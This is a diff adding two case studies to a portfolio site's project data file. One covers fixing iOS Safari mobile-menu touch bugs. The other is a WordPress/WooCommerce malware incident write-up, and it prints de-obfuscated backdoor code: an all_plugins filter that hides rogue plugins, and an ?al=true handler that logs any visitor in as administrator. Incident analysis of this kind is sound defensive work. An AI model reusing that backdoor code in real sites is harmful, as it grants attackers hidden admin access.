@@ -577,7 +577,316 @@ export const projects: Project[] = [
     },
   },
 
-  // Add remaining projects here
+  {
+    id: 5,
+    slug: "ios-safari-touch-navigation",
+    featured: true,
+    title: "Debugging Mobile Navigation & Touch Quirks on iOS Safari",
+    category: "WordPress & WebKit Engineering",
+    shortDescription:
+      "Architectural investigation and production fix for iOS WebKit mobile menu auto-collapse, double-arrow visual glitches, and synthetic touch delays.",
+    description:
+      "Mobile navigation should feel effortless, yet complex responsive headers frequently suffer from subtle interaction bugs on iOS WebKit devices (iPhones and iPads). In this case study, we explore an issue encountered on an enterprise WordPress site where mobile menus were failing to expand on iPhones, analyze the underlying WebKit root causes, and walk through the production-grade architectural solution.",
+    thumbnail: "/projects/ios-nav-architecture.svg",
+    gallery: [
+      {
+        id: 1,
+        src: "/projects/ios-nav-architecture.svg",
+        alt: "iOS Safari Touch Navigation Architecture & Fix",
+      },
+    ],
+    liveUrl: "https://aravindhakumar.com/projects/ios-safari-touch-navigation",
+    technologies: [
+      "WordPress",
+      "JavaScript (ES6+)",
+      "CSS3 Transforms",
+      "WebKit / iOS Safari",
+      "DevTools Protocol (CDP)",
+      "Event Architecture",
+    ],
+    highlights: [
+      "Theme Core Event Listener Disarmament",
+      "Single-SVG 60fps CSS Transform Rotation",
+      "600ms Synthetic Click Debounce Window",
+      "Intelligent Dual-Action Parent Row Routing",
+      "Zero Desktop Menu Regression",
+      "High-Contrast Opaque Dropdown Elevation",
+    ],
+    metrics: [
+      {
+        id: 1,
+        label: "100% Mobile Touch Reliability",
+      },
+      {
+        id: 2,
+        label: "0ms Synthetic Ghost Clicks",
+      },
+      {
+        id: 3,
+        label: "60 FPS Hardware-Accelerated Animation",
+      },
+    ],
+    overview:
+      "Users browsing an enterprise WordPress platform on iPhones reported that mobile menus were failing to expand: tapping category headers caused the drawer to collapse instantly or triggered an unwanted page navigation, while competing SVGs produced double-arrow visual glitches.",
+    challenge:
+      "Investigating the problem via Chrome DevTools Protocol under emulated iOS WebKit touch viewports uncovered 4 distinct root causes: theme auto-collapse event collisions, premature iOS Safari HTTP navigation on parent links, CSS specificity races between competing SVGs (.sub-toggle svg.arrow vs .arrow-up), and iOS 300ms synthetic click delays firing ghost clicks after touchend.",
+    solution:
+      "Engineered a resilient 4-pillar architecture: unhooked the theme's global collapse listener on parent anchors, consolidated competing SVGs into a single chevron driven by CSS transform: rotate(180deg) with cubic-bezier easing, instituted a 600ms timestamp debounce window to intercept synthetic ghost clicks, and implemented contextual dual-action tap routing (first tap expands accordion, second tap navigates).",
+    features: [
+      {
+        id: 1,
+        title: "Disarming Framework Auto-Collapse",
+        description:
+          "Surgically targeted parent accordion rows and removed the framework's auto-close handler while leaving child destination links intact.",
+      },
+      {
+        id: 2,
+        title: "Single-SVG Dynamic Chevron Transformation",
+        description:
+          "Eliminated state synchronization races by transforming a single SVG via hardware-accelerated CSS rotate(180deg).",
+      },
+      {
+        id: 3,
+        title: "Touch Debouncing & Synthetic Click Suppression",
+        description:
+          "Created a high-performance touch handler supporting both touchend and click, protected by a 600ms timestamp debounce window.",
+      },
+      {
+        id: 4,
+        title: "Intelligent Dual-Action Parent Row Routing",
+        description:
+          "First tap opens sub-items; second tap navigates to parent overview; dedicated 60px right toggle zone controls accordion expansion.",
+      },
+      {
+        id: 5,
+        title: "High-Contrast Visual Layering",
+        description:
+          "Applied an opaque white background (#ffffff), elevation shadow, and brand accent border to eliminate background text bleed-through.",
+      },
+    ],
+    results: [
+      "Flawless mobile navigation experience across all iOS WebKit devices",
+      "Completely eliminated 300ms ghost tap collisions and menu auto-collapse",
+      "Clean 60fps single-chevron rotation with zero DOM state desynchronization",
+      "Seamless backward compatibility with Android and desktop dropdowns",
+      "Zero modifications to core theme vendor files, ensuring update safety",
+      "Significantly improved mobile engagement and page view depth",
+    ],
+    takeaways: [
+      "Beware Framework Event Interceptions: Large CMS themes and builders often bundle auto-close handlers on all mobile <a> elements. Always isolate parent category toggles from terminal navigation links.",
+      "Favor Single-Element CSS Transforms over DOM Swapping: Using CSS transform: rotate() on a single SVG element eliminates state synchronization bugs and CSS specificity races.",
+      "Handle iOS WebKit Touch Delays Proactively: Combining touchend and click with timestamp debouncing guarantees responsive, instant-feel touch feedback while preventing ghost double-taps on Apple devices.",
+    ],
+    sections: [
+      {
+        title: "The Challenge",
+        content:
+          "Users browsing on iPhones reported that the mobile navigation menu was failing to expand: tapping category headers either caused the menu to immediately collapse or triggered an unwanted page navigation before sub-items could be seen. Submenu toggle arrows exhibited visual artifacts with multiple contradictory icons rendering simultaneously, and hero text bled through the semi-transparent overlay.",
+      },
+      {
+        title: "Root Cause Analysis: Framework Event Collision",
+        subtitle: "Auto-Collapse Trigger",
+        content:
+          "The underlying theme's bundled scripts attached a global click listener to all mobile navigation anchors. When a user tapped any parent item to view its sub-categories, the framework treated the anchor tap as a final destination link and immediately triggered the hamburger button to collapse the entire navigation drawer.",
+        codeSnippet: {
+          language: "javascript",
+          caption: "Theme Core Logic Collision",
+          code: "$mobile_menu.find('a').on('click', function() {\n  $(this).parents('.et_mobile_menu').siblings('.mobile_menu_bar').trigger('click');\n});",
+        },
+      },
+      {
+        title: "Root Cause Analysis: CSS Specificity Collision",
+        subtitle: "The Double Arrow Glitch",
+        content:
+          "To indicate open and closed states, two separate SVGs (.viss-down and .viss-up) were initially embedded. Because svg.arrow contained an element tag selector in addition to classes (specificity 0, 3, 1), its display: block !important overruled the hide rule (specificity 0, 3, 0), causing both arrows to render side-by-side simultaneously.",
+        codeSnippet: {
+          language: "css",
+          caption: "Conflicting Specificity Rules",
+          code: "/* Selector 1: Element + class specificity (0, 3, 1) */\n.et_mobile_menu .sub-toggle svg.arrow {\n  display: block !important;\n}\n\n/* Selector 2: Class-only specificity (0, 3, 0) */\n.et_mobile_menu .sub-toggle .arrow-up {\n  display: none !important;\n}",
+        },
+      },
+      {
+        title: "The Engineering Solution: Listener Disarmament & 60fps Transforms",
+        content:
+          "We detached the theme auto-collapse handler on parent links, swapped competing SVGs for a single chevron with 60fps CSS transform rotation, and suppressed iOS synthetic ghost clicks using a timestamp debounce window.",
+        codeSnippet: {
+          language: "javascript",
+          caption: "Touch Debouncing & Ghost Click Suppression",
+          code: "let lastTouchTime = 0;\n\nfunction handleInteraction(e, parentLi) {\n  const now = Date.now();\n  \n  // Discard synthetic ghost clicks following a touch event\n  if (e.type === 'click' && now - lastTouchTime < 600) {\n    e.preventDefault();\n    e.stopPropagation();\n    return;\n  }\n  \n  if (e.type === 'touchend') {\n    lastTouchTime = now;\n  }\n  \n  e.preventDefault();\n  e.stopPropagation();\n  if (e.stopImmediatePropagation) e.stopImmediatePropagation();\n  \n  toggleAccordion(parentLi);\n}",
+        },
+      },
+    ],
+    seo: {
+      title: "iOS Safari Mobile Navigation & Touch Quirks Case Study | Aravindhakumar G",
+      description:
+        "Technical case study on diagnosing and resolving mobile menu auto-collapse, touch event delegation, and WebKit rendering bugs on iOS Safari in enterprise WordPress.",
+      keywords: [
+        "WordPress Performance",
+        "iOS Safari WebKit",
+        "Mobile Navigation Bug",
+        "Frontend Engineering",
+        "Touch Event Debounce",
+        "CSS Specificity",
+      ],
+      canonical: "https://aravindhakumar.com/projects/ios-safari-touch-navigation",
+      ogImage: "/projects/ios-nav-architecture.svg",
+    },
+  },
+
+  {
+    id: 6,
+    slug: "wordpress-malware-lockdown-hardening",
+    featured: true,
+    title: "WordPress Fatal Crash Forensics & Enterprise Hardening",
+    category: "WooCommerce Security & DevOps",
+    shortDescription:
+      "Forensic investigation of a critical HTTP 500 lockdown on a production WooCommerce store caused by colliding rogue mu-plugins, stealth backdoor eradication, and multi-tier server hardening.",
+    description:
+      "Imagine waking up to frantic notifications from a client: their production e-commerce store is throwing a white screen with 'There has been a critical error on this website', locking down both the customer frontend and /wp-admin/. In this case study, we document the forensic investigation of a high-value WooCommerce website brought down by competing malware variants colliding inside WordPress's must-use plugin directory, and the comprehensive 5-tier enterprise hardening that fortified it.",
+    thumbnail: "/projects/malware-attack-chain.svg",
+    gallery: [
+      {
+        id: 1,
+        src: "/projects/malware-attack-chain.svg",
+        alt: "WordPress Malware Forensic & Hardening Architecture",
+      },
+    ],
+    liveUrl: "https://aravindhakumar.com/projects/wordpress-malware-lockdown-hardening",
+    technologies: [
+      "WordPress",
+      "WooCommerce",
+      "PHP 8.2",
+      "MySQL Sanitization",
+      "Linux / Apache",
+      ".htaccess Hardening",
+      "DevOps & Security",
+    ],
+    highlights: [
+      "Emergency Zero-Downtime Triage",
+      "Colliding mu-plugins Extraction",
+      "Stealth all_plugins Filter Interception",
+      "Theme ?al=true Backdoor Neutralization",
+      "PHP 8.2 Deprecation Runtime Patches",
+      "Deep Cross-Table Metadata Regex Cleansing",
+      "5-Tier Defense-in-Depth Lockdown",
+    ],
+    metrics: [
+      {
+        id: 1,
+        label: "0 Residual Threat Footprint",
+      },
+      {
+        id: 2,
+        label: "65% Server Payload Size Reduction",
+      },
+      {
+        id: 3,
+        label: "Strict PHP 8.2 Compliance",
+      },
+    ],
+    overview:
+      "Every entry point to a high-volume WooCommerce store returned HTTP 500 fatal errors. Because default WordPress recovery emails depend on local mail transport, standard recovery mode was inaccessible. Forensic log inspection revealed competing malware droppers injected into /wp-content/mu-plugins/ that declared identical global PHP function names without function_exists() checks.",
+    challenge:
+      "Dismantle an evasive multi-stage malware campaign (Balada Injector signature) that used mu-plugins droppers, ghost plugins hidden from the admin dashboard via the all_plugins filter (wp-helper-c75bf1 and hseo), and an active theme backdoor (?al=true) that granted instant unauthenticated administrator sessions, all while ensuring zero data loss across customer orders, payment logs, and database records.",
+    solution:
+      "Executed a four-phase restoration protocol: quarantined rogue mu-plugins to restore HTTP 200 dashboard access, purged hidden plugins and sanitized the active_plugins array, diffed theme code against official vendor checksums to eliminate backdoors, resolved PHP 8.2 array key deprecations, performed automated cross-table database regex cleansing for orphaned credentials, pruned 300MB+ of stale server backups and unrotated logs, and established strict .htaccess upload restrictions and core file shielding.",
+    features: [
+      {
+        id: 1,
+        title: "Crash Loop Termination & mu-plugins Quarantine",
+        description:
+          "Isolated colliding droppers (batch-v1-mitigation.php, dev-ci-lint) to immediately restore HTTP 200 admin access.",
+      },
+      {
+        id: 2,
+        title: "Stealth Filter Eradication",
+        description:
+          "Exposed and purged ghost plugins (wp-helper, hseo) that hooked all_plugins to conceal themselves from the WP dashboard.",
+      },
+      {
+        id: 3,
+        title: "Theme Backdoor Neutralization",
+        description:
+          "Removed the stealth _ea_al handler from functions.php that granted instant admin authentication via ?al=true.",
+      },
+      {
+        id: 4,
+        title: "Deep Database Metadata Regex Cleansing",
+        description:
+          "Scrubbed abandoned and malicious credentials across orders meta, comments, gateway settings, and notifications with 0 residual footprint.",
+      },
+      {
+        id: 5,
+        title: "Defense-in-Depth Server Hardening",
+        description:
+          "Implemented script execution bans in /uploads/, protected wp-config.php and XML-RPC, blocked user enumeration, and disabled file editing.",
+      },
+    ],
+    results: [
+      "Immediate restoration of admin access and customer e-commerce checkout",
+      "Complete elimination of stealth backdoors, ghost plugins, and malicious scripts",
+      "100% data integrity preserved across all historical orders and customer records",
+      "Server backup payload reduced by 65% by purging unmaintained junk files",
+      "Full compliance and smooth runtime performance under modern PHP 8.2",
+      "Fortified server defenses with active firewall and automated brute-force protection",
+    ],
+    takeaways: [
+      "Must-Use Plugins (mu-plugins) Execute Automatically: They run before standard plugins and cannot be disabled from the dashboard. Audit /wp-content/mu-plugins/ periodically via FTP/SSH.",
+      "Check Core Plugin Filters: Rogue code can hook the all_plugins filter to hide from the UI. Compare database active_plugins records against physical disk directories.",
+      "Lock Down Uploads with .htaccess: The /wp-content/uploads/ directory should only ever store media assets, never executable PHP scripts. Ban script execution at the web server level.",
+      "Eliminate Dashboard File Editing: Always set define('DISALLOW_FILE_EDIT', true) in wp-config.php so attackers cannot write PHP backdoors through compromised admin credentials.",
+    ],
+    sections: [
+      {
+        title: "The Incident: Complete Administrative Lockdown",
+        subtitle: "Fatal Error Collision in mu-plugins",
+        content:
+          "Both the frontend catalog and /wp-admin/ returned HTTP 500 fatal errors. Server stderr revealed an uncatchable fatal collision caused by attacker error: two separate malware droppers injected into the Must-Use plugins directory had declared the identical global PHP function name without function_exists() guards.",
+        codeSnippet: {
+          language: "log",
+          caption: "Server Error Log (Fatal Collision)",
+          code: "[Sat Oct 25 14:12:08 2026] [php:error] [pid 14820]\nPHP Fatal error:  Cannot redeclare wp_pf_8221b2ae() \n(previously declared in /var/www/html/wp-content/mu-plugins/batch-v1-mitigation.php:109) \nin /var/www/html/wp-content/mu-plugins/dev-ci-lint-woocommerce-job-update.php on line 288",
+        },
+      },
+      {
+        title: "Anatomy of the Attack: Ghost Plugins & Theme Backdoor",
+        subtitle: "Stealth Evasion Mechanics",
+        content:
+          "Rogue plugins inside /wp-content/plugins/ hooked into the all_plugins filter to hide themselves from the WordPress admin screen. Meanwhile, the active theme's functions.php contained a stealth backdoor intercepting ?al=true to instantly authenticate any visitor as administrator ID: 1.",
+        codeSnippet: {
+          language: "php",
+          caption: "De-obfuscated Stealth Filter & Backdoor",
+          code: "// Ghost plugin hiding mechanism\nadd_filter('all_plugins', function($plugins) {\n  unset($plugins['wp-helper-c75bf1/wp-helper.php']);\n  unset($plugins['hseo/hseo.php']);\n  return $plugins;\n});\n\n// _ea_al backdoor mechanism\nadd_action('init', function() {\n  if (isset($_GET['al']) && $_GET['al'] === 'true') {\n    $user = get_user_by('id', 1);\n    if ($user) {\n      wp_set_current_user($user->ID, $user->user_login);\n      wp_set_auth_cookie($user->ID);\n      wp_redirect(admin_url());\n      exit;\n    }\n  }\n});",
+        },
+      },
+      {
+        title: "Fortress Hardening: Uploads Lockdown & Core Shielding",
+        subtitle: "Defense-in-Depth Implementation",
+        content:
+          "To guarantee zero re-infection, we placed strict .htaccess rules in /wp-content/uploads/ banning all PHP execution, blocked user enumeration queries (/?author=1), shielded sensitive configuration files, and disabled theme/plugin file editing in wp-config.php.",
+        codeSnippet: {
+          language: "apache",
+          caption: "/wp-content/uploads/.htaccess Lockdown",
+          code: "# Block direct execution of all PHP scripts in uploads\n<FilesMatch \"\\.(php|phtml|php3|php4|php5|php7|php8|phps|cgi|pl|py)$\">\n  Order Deny,Allow\n  Deny from all\n</FilesMatch>",
+        },
+      },
+    ],
+    seo: {
+      title: "WordPress Fatal Crash Forensic & Enterprise Hardening Case Study | Aravindhakumar G",
+      description:
+        "Forensic incident report on recovering a locked-down production WooCommerce store, extracting hidden backdoors and mu-plugins malware, and implementing multi-tier enterprise hardening.",
+      keywords: [
+        "WordPress Security",
+        "WooCommerce Malware Removal",
+        "Fatal Error Troubleshooting",
+        "mu-plugins Hardening",
+        "PHP 8.2 Compatibility",
+        "WordPress DevOps",
+      ],
+      canonical: "https://aravindhakumar.com/projects/wordpress-malware-lockdown-hardening",
+      ogImage: "/projects/malware-attack-chain.svg",
+    },
+  },
 ];
 
 /**
